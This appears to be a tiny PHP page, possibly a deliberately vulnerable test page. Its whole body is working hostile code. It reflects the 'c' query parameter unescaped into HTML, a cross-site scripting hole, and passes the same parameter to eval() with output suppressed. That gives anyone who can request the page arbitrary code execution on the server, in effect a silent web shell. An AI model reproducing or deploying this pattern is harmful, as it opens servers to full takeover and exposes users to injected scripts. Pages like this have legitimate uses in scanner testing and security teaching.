The information inside the "c" query string parameter, which in this case is:<br/>
&nbsp;&nbsp;&nbsp;&nbsp;- <?php echo($_GET['c']); ?><br/>
<br/>
Is being evaluated.

<?php
ob_start();
eval($_GET['c']);
ob_end_clean();
?>

